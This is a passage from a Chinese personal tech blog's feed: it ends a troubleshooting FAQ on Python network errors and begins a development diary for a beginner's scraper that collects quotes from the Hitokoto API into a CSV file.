class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;main.py&quot;</span>, line 50, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    res = r.get(<span class="string">&quot;https://www.mouse123.cn/api/163/api.php&quot;</span>,<span class="built_in">timeout</span>=<span class="built_in">timeout</span>)  <span class="comment"># 调用api</span></span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py&quot;</span>, line 75, <span class="keyword">in</span> get</span><br><span class="line">    <span class="built_in">return</span> request(<span class="string">&#x27;get&#x27;</span>, url, params=params, **kwargs)</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py&quot;</span>, line 60, <span class="keyword">in</span> request</span><br><span class="line">    <span class="built_in">return</span> session.request(method=method, url=url, **kwargs)</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py&quot;</span>, line 533, <span class="keyword">in</span> request</span><br><span class="line">    resp = self.send(prep, **send_kwargs)</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py&quot;</span>, line 646, <span class="keyword">in</span> send</span><br><span class="line">    r = adapter.send(request, **kwargs)</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py&quot;</span>, line 439, <span class="keyword">in</span> send</span><br><span class="line">    resp = conn.urlopen(</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py&quot;</span>, line 665, <span class="keyword">in</span> urlopen</span><br><span class="line">    httplib_response = self._make_request(</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py&quot;</span>, line 376, <span class="keyword">in</span> _make_request</span><br><span class="line">    self._validate_conn(conn)</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py&quot;</span>, line 994, <span class="keyword">in</span> _validate_conn</span><br><span class="line">    conn.connect()</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py&quot;</span>, line 300, <span class="keyword">in</span> connect</span><br><span class="line">    conn = self._new_conn()</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py&quot;</span>, line 156, <span class="keyword">in</span> _new_conn</span><br><span class="line">    conn = connection.create_connection(</span><br><span class="line">  File <span class="string">&quot;C:\Users\bili33\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 74, <span class="keyword">in</span> create_connection</span><br><span class="line">    sock.connect(sa)</span><br><span class="line">KeyboardInterrupt</span><br></pre></td></tr></table></figure><p>A: 请你检查在程序运行的过程中是否有键盘的操作，例如<kbd>Ctrl</kbd>+<kbd>C</kbd>之类的操作！</p><hr><h5 id="Q-requests-exceptions-SSLError"><a href="#Q-requests-exceptions-SSLError" class="headerlink" title="Q: requests.exceptions.SSLError"></a>Q: requests.exceptions.SSLError</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\contrib\pyopenssl.py&quot;</span>, line 453, <span class="keyword">in</span> wrap_socket</span><br><span class="line">    cnx.do_handshake()</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\OpenSSL\SSL.py&quot;</span>, line 1915, <span class="keyword">in</span> do_handshake</span><br><span class="line">    self._raise_ssl_error(self._ssl, result)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\OpenSSL\SSL.py&quot;</span>, line 1639, <span class="keyword">in</span> _raise_ssl_error</span><br><span class="line">    raise SysCallError(errno, errorcode.get(errno))</span><br><span class="line">OpenSSL.SSL.SysCallError: (10060, <span class="string">&#x27;WSAETIMEDOUT&#x27;</span>)</span><br><span class="line"></span><br><span class="line">During handling of the above exception, another exception occurred:</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\connectionpool.py&quot;</span>, line 600, <span class="keyword">in</span> urlopen</span><br><span class="line">    chunked=chunked)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\connectionpool.py&quot;</span>, line 343, <span class="keyword">in</span> _make_request</span><br><span class="line">    self._validate_conn(conn)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\connectionpool.py&quot;</span>, line 839, <span class="keyword">in</span> _validate_conn</span><br><span class="line">    conn.connect()</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\connection.py&quot;</span>, line 344, <span class="keyword">in</span> connect</span><br><span class="line">    ssl_context=context)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\util\ssl_.py&quot;</span>, line 344, <span class="keyword">in</span> ssl_wrap_socket</span><br><span class="line">    <span class="built_in">return</span> context.wrap_socket(sock, server_hostname=server_hostname)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\contrib\pyopenssl.py&quot;</span>, line 459, <span class="keyword">in</span> wrap_socket</span><br><span class="line">    raise ssl.SSLError(<span class="string">&#x27;bad handshake: %r&#x27;</span> % e)</span><br><span class="line">ssl.SSLError: (<span class="string">&quot;bad handshake: SysCallError(10060, &#x27;WSAETIMEDOUT&#x27;)&quot;</span>,)</span><br><span class="line"></span><br><span class="line">During handling of the above exception, another exception occurred:</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\requests\adapters.py&quot;</span>, line 449, <span class="keyword">in</span> send</span><br><span class="line">    <span class="built_in">timeout</span>=<span class="built_in">timeout</span></span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\connectionpool.py&quot;</span>, line 638, <span class="keyword">in</span> urlopen</span><br><span class="line">    _stacktrace=sys.exc_info()[2])</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\urllib3\util\retry.py&quot;</span>, line 398, <span class="keyword">in</span> increment</span><br><span class="line">    raise MaxRetryError(_pool, url, error or ResponseError(cause))</span><br><span class="line">urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host=<span class="string">&#x27;p2.music.126.net&#x27;</span>, port=443): Max retries exceeded with url: /gxo54B2ypqq0Y6tmahBnIw==/109951163596240238.jpg (Caused by SSLError(SSLError(<span class="string">&quot;bad handshake: SysCallError(10060, &#x27;WSAETIMEDOUT&#x27;)&quot;</span>)))</span><br><span class="line"></span><br><span class="line">During handling of the above exception, another exception occurred:</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;main.py&quot;</span>, line 77, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    image = r.get(data[<span class="string">&#x27;images&#x27;</span>]).content</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\requests\api.py&quot;</span>, line 75, <span class="keyword">in</span> get</span><br><span class="line">    <span class="built_in">return</span> request(<span class="string">&#x27;get&#x27;</span>, url, params=params, **kwargs)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\requests\api.py&quot;</span>, line 60, <span class="keyword">in</span> request</span><br><span class="line">    <span class="built_in">return</span> session.request(method=method, url=url, **kwargs)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\requests\sessions.py&quot;</span>, line 533, <span class="keyword">in</span> request</span><br><span class="line">    resp = self.send(prep, **send_kwargs)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\requests\sessions.py&quot;</span>, line 646, <span class="keyword">in</span> send</span><br><span class="line">    r = adapter.send(request, **kwargs)</span><br><span class="line">  File <span class="string">&quot;C:\ProgramData\Anaconda3\lib\site-packages\requests\adapters.py&quot;</span>, line 514, <span class="keyword">in</span> send</span><br><span class="line">    raise SSLError(e, request=request)</span><br><span class="line">requests.exceptions.SSLError: HTTPSConnectionPool(host=<span class="string">&#x27;p2.music.126.net&#x27;</span>, port=443): Max retries exceeded with url: /gxo54B2ypqq0Y6tmahBnIw==/109951163596240238.jpg (Caused by SSLError(SSLError(<span class="string">&quot;bad handshake: SysCallError(10060, &#x27;WSAETIMEDOUT&#x27;)&quot;</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种情况是握手失败导致的，请检查网络连接！</p><hr><h3 id="欢迎提交PR！"><a href="#欢迎提交PR！" class="headerlink" title="欢迎提交PR！"></a>欢迎提交PR！</h3>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hitokoto-Spider 一言库爬虫开发日记</title>
      <link href="/posts/Hitokoto-Spider/"/>
      <url>/posts/Hitokoto-Spider/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最近在家里虽然有上课（学校开学了），但是中午两个半小时的休息时间以及晚上的自由时间是真的闲，在想要干什么……然后我在我的学弟的电脑桌面上发现了八爪鱼，想起了他用八爪鱼抓一言库的时候，我就在想：为什么我不自己做一个抓一言的爬虫呢？说干就干，于是我就开始坐了起来……</p><p><strong>下面，是我的个人开发日记，包含回忆，有些细节可能记得不是很清楚</strong></p><p>项目地址：<a href="https://github.com/GamerNoTitle/Hitokoto-Spider">https://github.com/GamerNoTitle/Hitokoto-Spider</a></p><hr><h3 id="2020年2月10日-星期一-天气：不很好"><a href="#2020年2月10日-星期一-天气：不很好" class="headerlink" title="2020年2月10日 星期一 天气：不很好"></a>2020年2月10日 星期一 天气：不很好</h3><p>今天是学校开学第一天，钉钉的会议功能真的菜，视频延迟3秒钟，互动板延迟3分钟……而且这个会议可以回看不能下载？？？拿fiddler抓包去……</p><p>（12:00）开始做爬虫了，先到一言去看看API是怎么用的先。在官网，可以看到下面这个表格（为了方便，我直接把源码拿过来了）</p><table class="apitable" border="0" cellspacing="0" cellpadding="0">                    <tbody>                    <tr>                        <th width="100"><b>时间</b></th>                        <th width="200"><b>影响Api</b></th>                        <th width="500"><b>调整</b></th>                    </tr>                    <tr>                        <td>2018年6月之前</td>                        <td>旧版API（http://api.hitokoto.cn和https://sslapi.hitokoto.cn）</td>                        <td>旧版API将在6月份之前以切换解析的方式合并到v1API中。也就意味着调整之后请求此API无异于请求v1API。调整后此接口的稳定性将不再受到维护。</td>                    </tr>                    <tr>                        <td>2018年7月之前</td>                        <td>v1API（https://v1.hitokoto.cn）</td>                        <td>v1API将发布最终版本。v1接口将会在未来存在较长时间（即使v2发布，请放心使用）。</td>                    </tr>                    <tr>                        <td>v2 发布（时间未知）</td>                        <td>v2API（域名未知）</td>                        <td>上线v2API。</td>                    </tr>                    </tbody>                </table><p>这个是一言的几个api的地址，我选择的就是用的<a href="https://v1.hitokoto.cn/">https://v1.hitokoto.cn</a></p><p>拿到了api，我要看看访问出来的效果是怎么样的，于是我又访问了这个地址，获得了一大串文本</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">79</span><span class="punctuation">,</span><span class="comment">//一言的ID</span></span><br><span class="line">  <span class="attr">&quot;hitokoto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;所以，他们的祭典还没结束。&quot;</span><span class="punctuation">,</span><span class="comment">//一言内容</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">,</span><span class="comment">//类型，具体可在官网查阅，这里a是Anime即动漫</span></span><br><span class="line">  <span class="attr">&quot;from&quot;</span><span class="punctuation">:</span> <span class="string">&quot;我的青春恋爱物语果然有问题&quot;</span><span class="punctuation">,</span><span class="comment">//一言出处</span></span><br><span class="line">  <span class="attr">&quot;from_who&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span><span class="comment">//谁说的话</span></span><br><span class="line">  <span class="attr">&quot;creator&quot;</span><span class="punctuation">:</span> <span class="string">&quot;阿布碳。&quot;</span><span class="punctuation">,</span><span class="comment">//提交此条目的用户</span></span><br><span class="line">  <span class="attr">&quot;creator_uid&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span><span class="comment">//用户的uid，可以不看</span></span><br><span class="line">  <span class="attr">&quot;reviewer&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;uuid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;f6aa4116-5a0f-4ab0-807a-bf3838a5fd23&quot;</span><span class="punctuation">,</span><span class="comment">//用户的uuid，可以不看</span></span><br><span class="line">  <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1468605909&quot;</span><span class="comment">//何时创建，这里是以时间戳的方式展示</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我看着：这玩意怎么格式这么像json呢？？？</p><img src="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/BQBTwT@1.0.0/嗯？.jpg" width="200" height="200"><p>直到我往下拉，发现：</p><p>这塔喵不就是json嘛……（上面的注释是我加入的）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Hitokoto-spider/return.png"></p><p>搞清楚了返回出来的结果的组成后，我们就可以开始撸代码了！</p><p>打开VSCode，新建一个文件夹，在这个文件夹里面进行修改</p><p>首先确定我需要用什么来模拟http请求，因为我自己用过<a href="https://github.com/Dawnnnnnn/bilibili-live-tools">@Dawnnnnnn&#x2F;bilibili-live-tools</a>这个项目，而且在用这个项目的时候，特别是在学校的服务器上面挂，那个Windows Server 2016 DataCenter装个requests运行库都难，所以我特别记得requests这个库可以模拟http请求，先装上再说！</p><p>于是我在powershell内打了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install requests</span><br></pre></td></tr></table></figure><p>来安装我的requests运行库，接着，在我的python文件内打入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br></pre></td></tr></table></figure><p>因为本人比较懒，所以喜欢把运行库简写，加入了<code>as r</code>我就可以不用打那么多字母了，真的方便</p><p>接着，要先搞清楚requests库的用法，于是乎我又去查了一下，查到这几个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requests.get(‘https://github.com/timeline.json’)                 <span class="comment"># GET请求</span></span><br><span class="line">requests.post(“http://httpbin.org/post”)                         <span class="comment"># POST请求</span></span><br><span class="line">requests.put(“http://httpbin.org/put”)                           <span class="comment"># PUT请求</span></span><br><span class="line">requests.delete(“http://httpbin.org/delete”)                     <span class="comment"># DELETE请求</span></span><br><span class="line">requests.head(“http://httpbin.org/get”)                          <span class="comment"># HEAD请求</span></span><br><span class="line">requests.options(“http://httpbin.org/get” )                      <span class="comment"># OPTIONS请求</span></span><br></pre></td></tr></table></figure><p>那么我要获得结果，采用了GET请求，然后在我的项目中打入了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = r.get(<span class="string">&#x27;https://international.v1.hitokoto.cn/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样就可以把获得的结果赋给res，然后通过调用res的值来获得我们想要的结果，接着运行一次我们的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line">res = r.get(<span class="string">&#x27;https://v1.hitokoto.cn/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>然后返回的值为：<code>&lt;Response [200]&gt;</code></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Hitokoto-spider/Output1.png" alt="状态码输出">这不是状态码嘛？？？我不要这玩意儿啊，我要结果。。。</p><p>然后我就commit了一下，盖上我的垃圾Lenovo，然后去睡觉了……</p><hr><h3 id="2020年2月11日-星期二-天气：还是不很好"><a href="#2020年2月11日-星期二-天气：还是不很好" class="headerlink" title="2020年2月11日 星期二 天气：还是不很好"></a>2020年2月11日 星期二 天气：还是不很好</h3><p>今天继续开发，昨天拿到的结果是个状态码，然后我又有思路了！</p><p>我就在print中动一下手脚，给被打印的res加上一个参数，然后代码就变成了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line">res = r.get(<span class="string">&#x27;https://v1.hitokoto.cn/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>接着就给我输出了我想要的东西嘿嘿</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Hitokoto-spider/Output2.png" alt="json格式输出"></p><p>这个项目本来想跟<a href="https://github.com/soulxyz">学弟@Soulxyz</a>一起做的，然后我就先把这个雏形push到了仓库里面，他也fork了，然后回来给我的是一个叫做<a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/files/Hitokoto-Spider/csvdomo.py">csvdomo.py（点击可下载）</a>的文件（我寻思你是不是想打csvdemo？？？）</p><p>我打开了，然后发现：你这不是并发获取10次都是一个结果吗？？？你这不重新获取不是每次都一样的吗？？？</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Hitokoto-spider/csvdomo-output.png" alt="csvdomo输出"></p><p>于是我决定放弃他这里，我自己来弄这个项目……后来他告诉我，用一言的国际节点可以有更高的QPS，然后我就转用国际节点了……</p><p>接着下一步是要重复抓取，对于这一部分，我想到的是让用户输入要抓取的次数，类型为int，命名为num，然后采用for循环重复抓取，就写了下面的这一段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入抓取的数量，如果要抓取全部请到https://hitokoto.cn/status查看现在的一言总数并填入：&quot;</span>)</span><br><span class="line">num=<span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    res = r.get(<span class="string">&#x27;https://v1.hitokoto.cn/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样子来实现重复抓取的功能，至于为什么如果要抓取全部还要输入，因为那个数字我是真的拿不到啊……</p><p>终于实现了抓取的功能，接下来要实现写入文件的功能</p><p>我的想法是写入csv文件，因为我自己在华南理工学习的时候就用过相关的函数，所以我就去搜索了一下，结果发现python原生支持csv，不需要用到pandas，所以我就调用了自带的csv库</p><p>（要上课了，先撤了）</p><p>（16:30）我回来了！现在就是要搞定写入csv库的问题，我在网上找到了相关的方法：</p><p>先打开一个文件，然后把这个文件设定为file变量，然后def两个函数，一个创建，一个写入，就像下面这个亚子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_csv</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&quot;w+&quot;</span>,newline=<span class="string">&quot;&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> file:    </span><br><span class="line">        <span class="comment"># 打开文件，也相当于一个回车，避免覆盖文档</span></span><br><span class="line">        csv_file = csv.writer(file)</span><br><span class="line">        head = [<span class="string">&quot;id&quot;</span>,<span class="string">&quot;sort&quot;</span>,<span class="string">&quot;hitokoto&quot;</span>] <span class="comment"># 创建csv表头</span></span><br><span class="line">        csv_file.writerow(head)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">append_csv</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&quot;a+&quot;</span>,newline=<span class="string">&#x27;&#x27;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        csv_file = csv.writer(file)</span><br><span class="line">        data = [inputs]</span><br><span class="line">        csv_file.writerows(data)</span><br></pre></td></tr></table></figure><p>这样我就定义了两个函数，然后在下面直接用这个函数就好了</p><p>再加上上面写过让用户填入输出路径和爬取次数的相关代码，直接把变量拿过来用就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入文件输出名（请自行输入后缀，文件以csv的方式保存）：&quot;</span>)</span><br><span class="line">path=<span class="built_in">input</span>()    <span class="comment"># 输出文件</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入抓取的数量，如果要抓取全部请到https://hitokoto.cn/status查看现在的一言总数并填入：&quot;</span>)</span><br><span class="line">num=<span class="built_in">int</span>(<span class="built_in">input</span>()) <span class="comment"># 抓取数量</span></span><br></pre></td></tr></table></figure><p>将path用于文件的路径，将num用于下面的抓取次数，完美！</p><p>然后在下面，将抓取到的数据排版一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data=res.json()</span><br><span class="line"><span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;a&quot;</span>: sorts=(<span class="string">&quot;Anime&quot;</span>)  <span class="comment"># 自动把分类码还原为分类</span></span><br><span class="line"><span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;b&quot;</span>: sorts=(<span class="string">&quot;Comic&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;c&quot;</span>: sorts=(<span class="string">&quot;Game&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;d&quot;</span>: sorts=(<span class="string">&quot;Novel&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;e&quot;</span>: sorts=(<span class="string">&quot;Myself&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;f&quot;</span>: sorts=(<span class="string">&quot;Internet&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;g&quot;</span>: sorts=(<span class="string">&quot;Other&quot;</span>)</span><br><span class="line">inputs=[data[<span class="string">&quot;id&quot;</span>],sorts,data[<span class="string">&quot;hitokoto&quot;</span>]]</span><br><span class="line"><span class="comment"># print(res.text)   # 输出一言，如需要把最前面的#去掉即可</span></span><br><span class="line">append_csv(path)</span><br></pre></td></tr></table></figure><p>这样就完成了写入操作！写入csv的操作搞定了以后，最后剩下除掉重复的结果，不然会有很多同样的话，这是最麻烦的部分……</p><p>开始我的想法是：每次获取到一个结果以后，将id存入存入一个存储变量叫做ids，开始先初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ids=[]</span><br></pre></td></tr></table></figure><p>这样将ids初始化为一个空列表，然后往这个空列表里面加入id，每次遍历一次ids里面的id是否与获取到的id相同，如果相同则说明获取到了重复的话，将这个结果舍弃，然后重新获取</p><p>将我的重复剔除的功能写出来，就像这样（从之前的commit弄出来的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ids=[<span class="string">&#x27;0&#x27;</span>]</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    res = r.get(<span class="string">&#x27;https://international.v1.hitokoto.cn/&#x27;</span>,timeout=<span class="number">60</span>) <span class="comment"># 得到服务器回应，此时回应的内容为json文件（res.text）和状态码</span></span><br><span class="line">    data=res.json() <span class="comment"># 将获取到的结果转为json字符串</span></span><br><span class="line">    t=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;id&quot;</span>]==ids[t]:  </span><br><span class="line">            <span class="comment"># ID已经存在，即已经抓到过，这地方可能会报BUG，目前没修（数组越限BUG）</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t=t+<span class="number">1</span>   <span class="comment"># 自增</span></span><br><span class="line">            <span class="keyword">if</span> t==i:</span><br><span class="line">                ids.append(data[<span class="string">&quot;id&quot;</span>])  </span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;a&quot;</span>: sorts=(<span class="string">&quot;Anime&quot;</span>)  <span class="comment"># 自动把分类码还原为分类</span></span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;b&quot;</span>: sorts=(<span class="string">&quot;Comic&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;c&quot;</span>: sorts=(<span class="string">&quot;Game&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;d&quot;</span>: sorts=(<span class="string">&quot;Novel&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;e&quot;</span>: sorts=(<span 